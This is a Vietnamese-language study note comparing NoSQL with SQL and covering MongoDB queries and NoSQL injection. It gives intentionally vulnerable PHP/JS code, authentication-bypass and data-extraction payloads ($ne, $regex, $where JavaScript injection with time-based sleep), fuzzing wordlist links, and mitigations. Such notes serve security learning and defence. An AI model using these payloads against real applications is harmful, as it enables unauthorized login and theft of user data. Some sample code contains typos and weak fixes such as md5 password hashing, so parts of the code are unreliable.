# NoSQL

Với các cơ sở dữ liệu quan hệ, các cấu trúc dữ liệu được ghi một cách định trước nghiêm ngặt theo cấu trúc dạng bảng. Đồng thời, khi mà lượng dữ liệu quá lớn hiêụ năng truy vấn giảm đi đáng kể. Ngoài ra cũng khó mở rộng hệ thống phân tán.

Chính vì thế, NoSQL nổi lên để bù đắp vào điểm yếu đó. NoSQL là hệ quản trị cơ sở dữ liệu phi quan hệ. Dữ liệu của nó được lưu dưới các dạng linh hoạt. Gồm 4 loại chính:

| Type | Description | Top engines |
|------|-------------|-------------|
| Document-Oriented | lưu data dưới dạng documents ( cái mà chứa nhiều cặp fields and values ). Những document này thường được encoded dưới định dạng JSON or XML | MongoDB, Amazon DynamoDB |
|Key-Value | dữ liệu được lưu dưới dạng key:value | Redis, Amazon DynamoDB |
Wide-Column Store | được sử dụng để lưu lượng data lớn bằng tables, row and columns giống relational database, but with the ability to handle more ambiguous data types | Apache Cassandra, Apache HBase |
| Graph | Stores data in nodes and uses edges to define relationships | Neo4j, Virtuoso |

So sánh NoSQL với SQL:

| Tiêu chí | SQL (RDBMS) | NoSQL |
| :--- | :--- | :--- |
| **Mô hình** | Bảng (hàng/cột), có khóa ngoại. | Document, Key-Value, Column, Graph. |
| **Cấu trúc** | Cố định, khai báo trước. | Linh hoạt, tự do (Schema-less). |
| **Mở rộng** | Chiều dọc (Nâng cấp 1 máy). | Chiều ngang (Thêm nhiều máy). |
| **Nhất quán** | Tuyệt đối (ACID), chính xác 100%. | Nhất quán sau (Độ trễ vài giây). |
| **Ưu điểm** | An toàn cao, `JOIN` dữ liệu tốt. | Đọc/ghi siêu tốc, chịu tải cực lớn. |
| **Nhược điểm** | Chậm khi dữ liệu lớn, khó phân tán. | Không mạnh về `JOIN` và ví tiền/tài chính. |

Chọn SQL khi dữ liệu có **cấu trúc ổn định**, mối quan hệ giữa các bảng phức tạp và yêu cầu **tính chính xác tuyệt đối 100%** (không chấp nhận sai lệch dù chỉ 1 giây).

*   **Ví dụ chức năng:** Quản lý số dư ví tiền, xử lý thanh toán hóa đơn, hệ thống kế toán, quản lý tài khoản đăng nhập, hệ thống quản lý nhân sự (HRM).

Chọn NoSQL khi dữ liệu có **dung lượng cực lớn (Big Data)**, cấu trúc **linh hoạt/thay đổi liên tục**, cần tốc độ **đọc/ghi siêu nhanh** và khả năng mở rộng hệ thống dễ dàng.

*   **Ví dụ chức năng:** Hệ thống chat real-time, bộ nhớ đệm (caching) phiên đăng nhập, giỏ hàng trực tuyến, luồng tin tức (News Feed) mạng xã hội, thu thập log/tọa độ GPS từ thiết bị IoT.

## MongoDB

MongoDB là 1 document-oriented database (data được lưu dưới dạng collections of documents ). Default port 27017/tcp. 

```mongo
# Ví dụ 1 collection gồm 2 documents

[
{
"_id": ObjectId("63651456d18bf6c01b8eeae9"),
"type": "Granny Smith",
"price": 0.65,
"origin": "Australia"
},
{
"_id": ObjectId("63651456d18bf6c01b8eeb10"),
"type": "Fuji",
"price": 0.85,
"stock": 120,
"tags": ["sweet", "crispy"]
}
]
```
### Query

Các operator phổ biến

| Type | Operator | Description | Example |
| :--- | :--- | :--- | :--- |
| Comparison | `$eq` | Matches values which are equal to a specified value | `type: {$eq: "Pink Lady"}` |
| Comparison | `$gt` | Matches values which are greater than a specified value | `price: {$gt: 0.30}` |
| Comparison | `$gte` | Matches values which are greater than or equal to a specified value | `price: {$gte: 0.50}` |
| Comparison | `$in` | Matches values which exist in the specified array | `type: {$in: ["Granny Smith", "Pink Lady"]}` |
| Comparison | `$lt` | Matches values which are less than a specified value | `price: {$lt: 0.60}` |
| Comparison | `$lte` | Matches values which are less than or equal to a specified value | `price: {$lte: 0.75}` |
| Comparison | `$nin` | Matches values which are not in the specified array | `type: {$nin: ["Golden Delicious", "Granny Smith"]}` |
| Logical | `$and` | Matches documents which meet the conditions of both specified queries | `$and: [{type: 'Granny Smith'}, {price: 0.65}]` |
| Logical | `$not` | Matches documents which do not meet the conditions of a specified query | `type: {$not: {$eq: "Granny Smith"}}` |
| Logical | `$nor` | Matches documents which do not meet the conditions of any of the specified queries | `$nor: [{type: 'Granny Smith'}, {price: 0.79}]` |
| Logical | `$or` | Matches documents which meet the conditions of one of the specified queries | `$or: [{type: 'Granny Smith'}, {price: 0.79}]` |
| Evaluation | `$mod` | Matches values which divided by a specific divisor have the specified remainder | `price: {$mod: [4, 0]}` |
| Evaluation | `$regex` | Matches values which match a specified RegEx | `type: {$regex: /^G.*/}` |
| Evaluation | `$where` | Matches documents which satisfy a JavaScript expression | `$where: 'this.type.length === 9'` |

- Tìm kiếm (Find)

```
db.users.find({ username: "admin", password: { "$ne": "abc" } })
```

- Cập nhật (Update)

```
db.users.updateMany({ username: { "$gt": "" } }, { $set: { password: "123" } })
```

- Xóa (Delete)

```
db.products.deleteMany({ product_id: { "$gte": "" } })
```

- Thêm mới (Insert)

```
db.users.insertOne({ username: "hacker", password: "123", role: "admin", balance: 999999 })
```

# NoSQL Injection

Xảy ra khi dữ liệu từ người dùng truyền trực tiếp vào câu truy vấn mà không được sanitized đúng cách. Khác với SQL ta có thể dump toàn bộ database, thì trong NoSQLi thông thường ta chỉ được giới hạn dưới collection được truyền vào.

1 số cách truyền dữ liệu dạng mảng tùy vào framework
```
param (post data tương tự)
?email[$ne]=xxx
?email=$ne&email=xxx

json
{
    "email":{"$ne":"xxx"}
}
```

## Authentication Bypass

```js
# Example vulnerability code
...
if ($_SERVER['REQUEST_METHOD'] === "POST"):
if (!isset($_POST['email'])) die("Missing `email` parameter");
if (!isset($_POST['password'])) die("Missing `password` parameter");
if (empty($_POST['email'])) die("`email` can not be empty");
if (empty($_POST['password'])) die("`password` can not be empty");
$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$query = new MongoDB\Driver\Query(array("email" => $_POST['email'],
"password" => $_POST['password']));
$cursor = $manager->executeQuery('mangomail.users', $query);
if (count($cursor->toArray()) > 0) {
...
```

```js
# Payload Authentication Bypass

email[$ne]=xxx&password[$ne]=xxx
email[$gt]=&password=[$gt]
email[$gte]=&password[$gte]
email[$exists]=true&password[$exists]=true
email[$regex]=.*&password[$regex]=.*
```

## In-Band Data Extraction

```php
# Example vulnerable query code

db.types.find({
    name: $_GET['q']
    });
```

```
# Payload Extraction

q[$regex]=.*
q[$ne]=xxx
q[$gt]=''       -> match all document whose name is bigger than empty string
q[$gte]=''      -> match all document whose name is bigger or equal than empty string
q[$lt]=~        -> ~ là kí tự largest printable trong ASCII
q[$lte]=~
```

## Blind Data Extraction

```
# Payload Blind Data Extraction

q[$regex]=^a.* -> q[$regex]=^ba.* -> q[$regex]=^bla.* ... -> q[$regex]=^blind$
```

## Server-side Javascript Injection

`$where` operator cho phép ta thực thi một sandbox JS trên collections. Mặc định trong các phiên bản mới của MongoDB, tính năng này được tắt vì tính năng bảo mật.

```
...
db.users.find({
$where: "this.username ==\"" + req.body['username'] + "\" && thí.password == \"" + req.body['password'] + \""
});
...

# Ngoài trường hợp này, thì ta cũng có thể truyền trực tiếp q[$where]=... trong các trường hợp trên nếu $where được bật
```

```
# Payload Authentication Bypass

username=" || 1=1 || "1"=="1 và password là giá trị bất kì

# Error-based Injection
username=" || if (this._id > '1') { throw new Error(JSON.stringify(this)) } || "1"=="1
-> username=" || if (this._id > '61') { throw new Error(JSON.stringify(this)) } || "1"=="1
-> username=" || if (this._id > '651') { throw new Error(JSON.stringify(this)) } || "1"=="1 -> ...

# Blind Data Extraction

## Boolean-based
username=" || this.username.match('^a.*') || "1"=="1
-> username=" || this.username.match('^ba.*') || "1"=="1 -> ...

## Time-based
username=" || if(this.username.match('^a.*)) sleep(5000) || "1"="1
-> username=" || if(this.username.match('^ba.*')) sleep(5000) || "1"="1
```
## Others Payload
```
# Comment in SSJI
' || 1==1//
' || 1==1%00

# Trong trường hợp: let query = '{"username":"' + req.body.username + '","role":"user"}';
-> req.body.username = ","username":{"$ne":""},"$comment":"dup-key

# PHP Arbitrary Function Execution
# The $func operator in the MongoLite library can expose arbitrary function execution in vulnerable applications, as demonstrated in this Cockpit CMS report
user[$func]=var_dump

# Get info from different collection
# It's possible to use $lookup to get info from a different collection.
# NOTE: $lookup and other aggregation functions are only available if the aggregate() function was used to perform the search instead of the more common find() or findOne() functions
const data = await db.products.aggregate(req.body.pipeline); 

->

[
  {
    "$lookup": {
      "from": "users",
      "as": "resultado",
      "pipeline": [
        {
          "$match": {
            "password": {
              "$regex": "^.*"
            }
          }
        }
      ]
    }
  }
]
```

## Tools

```
# Fuzzing Wordlists
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/NoSQL.txt
https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt

NoSQLMap
```

# Prevent

* Strip or rejeject keys that start with `$`
* Disable server-side Javascript on self-hosted MongoDB (--noscripting or security.javascriptEnabled: false) ( tắt $where )
* Ưu tiên sử dụng `$expr` thay vì `$where`
* Validate data types and disallow array or object where scalars are expected

```php
# String Casting with Input Validation
...
if(!filter_var($_POST['email'],FILTER_VALIDATE_EMAIL)){
    // Invalid email
}
$query = new MongoDB\Driver\Query(array("email" => strval($_POST['email']), "password" => strval($_POST['password'])));
...
```

```
# Trong trường hợp user input nằm trong $where -> string casting là k hiệu quả -> query rewrting sang operator khác mà không thực thi Javascript

Example vul:
...php
$q = array('$where' => 'this.username=="' . $username . '" && this.password=="' . $password . '"');
$query = new Mongo\Driver\Query($q);
...

Patch:
...
$q = array('username' => strval($username), 'password' => md5($password));
$query = new Mongo\Driver\Query($q);
...
```
